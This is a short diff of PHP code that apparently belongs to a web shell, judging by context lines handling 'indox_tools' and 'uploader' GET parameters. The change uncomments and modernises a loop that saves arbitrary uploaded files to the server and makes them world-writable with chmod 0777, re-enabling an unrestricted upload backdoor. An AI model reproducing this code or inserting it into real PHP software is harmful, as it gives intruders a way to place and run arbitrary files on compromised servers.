@@ -379,8 +379,7 @@ if(isset($_GET['indox_tools'])) {
 }
 
 //move file upload
-/*
-while(list($key,$value) = each($_FILES['file']['name']))
+foreach ($_FILES['file']['name'] as $key => $value)
 {
     if(!empty($value)){ 
         //$filename = rand(1,100000).$value;
@@ -402,7 +401,7 @@ while(list($key,$value) = each($_FILES['file']['name']))
         chmod("$add",0777);
     }
 }
-*/
+
 // input upload handle
 if (isset($_GET['uploader'])) 
 {
